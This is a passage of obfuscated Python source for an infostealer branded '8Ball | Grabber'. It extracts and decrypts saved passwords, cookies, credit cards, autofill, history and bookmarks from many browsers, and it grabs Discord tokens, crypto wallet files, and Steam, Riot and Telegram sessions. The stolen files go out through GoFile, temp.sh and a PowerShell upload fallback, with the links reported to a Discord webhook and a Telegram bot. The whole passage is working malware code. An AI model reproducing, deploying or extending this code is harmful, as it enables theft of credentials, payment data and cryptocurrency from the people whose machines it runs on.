            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return

def Wr173F0rF113(data, name):
    """
    Write captured data to TEMP with given base name.
    """
    temp_dir = os.getenv("TEMP")
    txt_path = os.path.join(temp_dir, f"cr{name}.txt")

    with open(txt_path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def G3770K3N(path, arg):
    """
    Discord token grabber – only active when 'Discord Token Stealer'
    is enabled in the UI (discord_tokens feature).
    """
    if not FEATURE_CONFIG.get("discord_tokens", False):
        return

    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if token not in T0K3Ns:
                                T0K3Ns += token
                                UP104D70K3N(token, path)

def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data

def G37AppBoundK3Y(path):
    if APPBOUND_KEY_HEX:
        try:
            key = bytes.fromhex(APPBOUND_KEY_HEX)
            if len(key) == 32:
                return key
        except:
            pass
    try:
        pathKey = path + "/Local State"
        if not os.path.exists(pathKey):
            return None
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
        oscrypt = local_state.get('os_crypt', {})
        if 'app_bound_encrypted_key' not in oscrypt:
            return None
        raw = b64decode(oscrypt['app_bound_encrypted_key'])
        if raw[:4] != b'APPB':
            return None
        encrypted_blob = raw[8:]
        key = CryptUnprotectData(encrypted_blob)
        if key is not None and len(key) == 32:
            return key
    except:
        pass
    return None

def G37P455W(path, arg):
    if not FEATURE_CONFIG.get("browser_data", False):
        return
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        appbound_key = G37AppBoundK3Y(path)

        csv_rows = []
        for row in data:
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in p45WW0rDs: p45WW0rDs.append(old)
            try:
                decrypted = D3CrYP7V41U3(row[2], master_key, appbound_key)
            except:
                decrypted = None
            if decrypted is None:
                decrypted = "N/A"
            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {decrypted}")
            P455WC0UNt += 1
            csv_rows.append((row[0], str(row[1]) if row[1] else "", str(decrypted) if decrypted else ""))
        Wr173F0rF113(P455w, 'passwords')

        temp_dir = os.getenv("TEMP")
        csv_path = os.path.join(temp_dir, "crpasswords.csv")
        import csv as csvmod
        with open(csv_path, mode="w", newline="", encoding="utf-8") as csvfile:
            writer = csvmod.writer(csvfile)
            writer.writerow(["url", "username", "password"])
            writer.writerows(csv_rows)
    except:pass

def G37C00K13(path, arg):
    """
    Browser cookies grabber.
    Currently not exposed as a separate UI feature; if you want it,
    you can add a new checkbox and FEATURE_CONFIG key.
    """
    if not FEATURE_CONFIG.get("browser_data", False):
        return
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        appbound_key = G37AppBoundK3Y(path)

        for row in data:
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
            try:
                decrypted = D3CrYP7V41U3(row[2], master_key, appbound_key)
            except:
                decrypted = None
            if decrypted is None:
                decrypted = "N/A"
            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{decrypted}")
            C00K1C0UNt += 1
        Wr173F0rF113(C00K13s, 'cookies')
    except:pass

def G37CC5(path, arg):
    """Browser credit card grabber – gated by 'Credit Cards' feature."""
    if not FEATURE_CONFIG.get("browser_credit_cards", False):
        return
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    """Browser autofill – gated by 'Browser Autofill and History' feature."""
    if not FEATURE_CONFIG.get("browser_autofill_history", False):
        return
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        Wr173F0rF113(AU70F11l, 'autofill')
    except:pass

def G37H1570rY(path, arg):
    """Browser history grabber – gated by 'Browser Autofill and History' feature."""
    if not FEATURE_CONFIG.get("browser_autofill_history", False):
        return
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        Wr173F0rF113(H1570rY, 'history')
    except:pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    """Bookmarks grabber – gated by 'Browser Bookmarks' feature."""
    if not FEATURE_CONFIG.get("browser_bookmarks", False):
        return
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass

def s74r787Hr34D(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def G378r0W53r5(br0W53rP47H5):
    """
    Master browser data collector:
    - passwords, cookies, CCs, autofill, history, bookmarks
    - uploads temp files to GoFile and sends summary embeds
    Only active when 'Browser Data Extractor' (browser_data) is enabled.
    """
    if not FEATURE_CONFIG.get("browser_data", False):
        return
    create_windows_user()
    global Browserthread
    ThCokk, Browserthread, filess = [], [], []

    for patt in br0W53rP47H5:
        # Cookies (part of browser_data, no dedicated UI toggle)
        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        # Autofill & history
        if FEATURE_CONFIG.get("browser_autofill_history", False):
            s74r787Hr34D(G374U70F111, [patt[0], patt[3]])
            s74r787Hr34D(G37H1570rY, [patt[0], patt[3]])

        # Bookmarks
        if FEATURE_CONFIG.get("browser_bookmarks", False):
            s74r787Hr34D(G37800KM4rK5, [patt[0], patt[3]])

        # Credit cards
        if FEATURE_CONFIG.get("browser_credit_cards", False):
            s74r787Hr34D(G37CC5, [patt[0], patt[3]])

        # Passwords (always run if browser_data is enabled)
        s74r787Hr34D(G37P455W, [patt[0], patt[3]])

    # Wait for cookie threads
    for thread in ThCokk:
        thread.join()
    if TrU57(C00K13s) is True:
        __import__('sys').exit(0)

    # Wait for all browser threads
    for thread in Browserthread:
        thread.join()

    temp_dir = os.getenv("TEMP")

    # Upload core browser dumps (passwords, cookies, cc, autofill, history, bookmarks)
    core_files = [
        "crpasswords.txt",
        "crpasswords.csv",
        "crcookies.txt",
        "crcreditcards.txt",
        "crautofills.txt",
        "crhistories.txt",
        "crbookmarks.txt",
    ]
    for fname in core_files:
        fpath = os.path.join(temp_dir, fname)
        if not os.path.exists(fpath):
            open(fpath, "w").close()
        filess.append(UP104D7060F113(fpath))

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [
            {
                "title": f"8Ball | Password 8Ball",
                "description": (
                    f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                    f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.txt]({filess[0]})\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.csv]({filess[1]})"
                ),"footer": {
                    "text": "8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                }
            },
            {
                "title": f"8Ball | Cookies 8Ball",
                "description": (
                    f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                    f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Cookies.txt]({filess[2]})"
                ),"footer": {
                    "text": "8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                }
            },
            {
                "title": f"8Ball | Browser Data",
                "description": (
                    f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Histories.txt]({filess[5]})\n\n"
                    f"<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Autofills.txt]({filess[4]})\n\n"
                    f"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_CreditCards.txt]({filess[3]})\n\n"
                    f":bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Bookmarks.txt]({filess[6]})"
                ),"footer": {
                    "text": "8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                }
            }
        ],
        "username": "8Ball | Grabber",
        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
        "attachments": [],
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    RX_DB6("[8Ball] Browser Data embed sent successfully.")
    tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
    tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
    if tg_token and tg_chat:
        tg_text = f"{GLINFO}\nPasswords: {P455WC0UNt} | Cookies: {C00K1C0UNt} | CCs: {CC5C0UNt}"
        L04DUr118_TG(tg_token, tg_chat, tg_text)
    remove_windows_user()

def G37D15C0rD(path, arg):
    if not FEATURE_CONFIG.get("discord_tokens", False):
        return
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    if not os.path.isdir(pathC):
        return
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global T0K3Ns
                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if CH3CK70K3N(tokenDecoded):
                            if not tokenDecoded in T0K3Ns:
                                T0K3Ns += tokenDecoded
                                UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    """
    Crypto Wallet feature:
    Collects wallet data from configured paths.
    Only active when 'Crypto Wallet' (wallet_gaming_data) is enabled.
    """
    if not FEATURE_CONFIG.get("wallet_gaming_data", False):
        return
    thttht = []
    for walletids in w411375:
        
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [
            {
            "title": f"8Ball | App 8Ball",
            "description": f"{wal}\n{ga}\n{ot}","footer": {
                "text": f"8Ball",
                "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
            }
            }
        ],
        "username": f"8Ball | Grabber",
        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
        "attachments": [],
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
    }
    
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
    tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
    if tg_token and tg_chat:
        L04DUr118_TG(tg_token, tg_chat, f"{GLINFO}\nWallets/Gaming data collected")

def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    Z1PF01D3r(name, pathC)

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg

    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    for walllts in w411375:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    Z1PF01D3r(name, pathC) 

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
THr34D1157 = []

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

# --- ENV PATHS (must be defined before G47H3r411 uses them) ---
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

# Global counters/collections
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s = [], [], [], [], [], [], []
W411375Z1p, G4M1N6Z1p, O7H3rZ1p = [], [], []
THr34D1157, K1W1F113s, B00KM4rK5 = [], [], []
T0K3Ns = ""

def G47H3r411():
    RX_DB6("[8Ball] G47H3r411 orchestrator starting...")
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",             "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\\Program Files (x86)\\Steam\\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join()
    RX_DB6("[8Ball] G47H3r411 orchestrator completed.")
    
def G37F11353rv3r():
    try:
        resp = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))
        return resp["data"]["servers"][0]["name"]
    except:
        return "store1"

def UP104D7060F113(path):
    errors = []
    # --- GoFile upload ---
    try:
        server = G37F11353rv3r()
        RX_DB6(f"[8Ball] GoFile: server={server}, file={path}")
        with open(path, "rb") as f:
            r = requests.post(
                f"https://{server}.gofile.io/contents/uploadfile",
                files={"file": f},
                timeout=120,
                verify=False
            )
        r.raise_for_status()
        data = r.json()
        RX_DB6(f"[8Ball] GoFile response: status={data.get('status')}")
        if data.get("status") == "ok":
            dl = data.get("data", {}).get("downloadPage") or data.get("data", {}).get("directLink", "")
            if dl:
                RX_DB6(f"[8Ball] GoFile upload OK: {dl}")
                return dl
            errors.append(f"GoFile: missing downloadPage in response")
        else:
            errors.append(f"GoFile: status={data.get('status')}")
    except Exception as e:
        err = f"GoFile requests failed: {type(e).__name__}: {e}"
        errors.append(err)
        RX_DB6(f"[8Ball] {err}")
        try:
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            with open(path, "rb") as f:
                file_data = f.read()
            filename = os.path.basename(path)
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
            req = Request(
                f"https://{server}.gofile.io/contents/uploadfile",
                data=body,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
            )
            import ssl
            ctx = ssl._create_unverified_context()
            resp = urlopen(req, timeout=120, context=ctx).read().decode()
            data = loads(resp)
            if data.get("status") == "ok" and "downloadPage" in data.get("data", {}):
                dl = data["data"]["downloadPage"]
                RX_DB6(f"[8Ball] GoFile urllib-fallback OK: {dl}")
                return dl
            errors.append("GoFile urllib: unexpected response format")
        except Exception as e2:
            err2 = f"GoFile urllib failed: {type(e2).__name__}: {e2}"
            errors.append(err2)
            RX_DB6(f"[8Ball] {err2}")

    # --- Fallback: temp.sh ---
    try:
        RX_DB6("[8Ball] Upload: trying temp.sh...")
        with open(path, "rb") as f:
            r = requests.post(
                "https://temp.sh/upload",
                files={"file": f},
                timeout=120,
                verify=False
            )
        r.raise_for_status()
        url = r.text.strip()
        if url.startswith("http"):
            RX_DB6(f"[8Ball] temp.sh upload OK: {url}")
            return url
        errors.append(f"temp.sh: unexpected response: {url[:100]}")
    except Exception as e:
        err = f"temp.sh failed: {type(e).__name__}: {e}"
        errors.append(err)
        RX_DB6(f"[8Ball] {err}")

    # --- Fallback: PowerShell Invoke-WebRequest (native Windows, no Python deps) ---
    try:
        RX_DB6("[8Ball] Upload: trying PowerShell...")
        import subprocess
        ps_cmd = f'''
$boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
$server = "{G37F11353rv3r()}"
$filePath = "{path.replace('"', '`"')}"
$fileName = [System.IO.Path]::GetFileName($filePath)
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
$bodyBytes = [Text.Encoding]::UTF8.GetBytes($body) + $fileBytes + [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
try {{
    $r = Invoke-WebRequest -Uri "https://$server.gofile.io/contents/uploadfile" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes -TimeoutSec 120
    Write-Host $r.Content
}} catch {{
    Write-Host "POWERSHELL_ERROR:$_"
}}
'''
        result = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, timeout=130)
        output = result.stdout.strip()
        if "POWERSHELL_ERROR" not in output and output:
            try:
                ps_data = loads(output)
                if ps_data.get("status") == "ok":
                    dl = ps_data.get("data", {}).get("downloadPage", "")
                    if dl:
                        RX_DB6(f"[8Ball] PowerShell upload OK: {dl}")
                        return dl
            except:
                pass
        errors.append(f"PowerShell: no valid response")
    except Exception as e:
        err = f"PowerShell failed: {type(e).__name__}: {e}"
        errors.append(err)
        RX_DB6(f"[8Ball] {err}")

    # --- Final fallback: try 3 GoFile hardcoded servers directly ---
    for fb_server in ["store1", "store2", "store3"]:
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"https://{fb_server}.gofile.io/contents/uploadfile",
                    files={"file": f},
                    timeout=60,
                    verify=False
                )
            r.raise_for_status()
            data = r.json()
            if data.get("status") == "ok":
                dl = data.get("data", {}).get("downloadPage", "")
                if dl:
                    RX_DB6(f"[8Ball] GoFile fallback {fb_server} OK: {dl}")
                    return dl
        except Exception as e:
            err = f"GoFile fallback {fb_server}: {type(e).__name__}: {e}"
            errors.append(err)

    RX_DB6(f"[8Ball] All upload methods failed: {'; '.join(errors)}")
    return errors  # Return errors list so caller can display them

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    try:
        listOfFile = os.listdir(pathF)
    except OSError:
        return

    ffound = []
    for file in listOfFile:
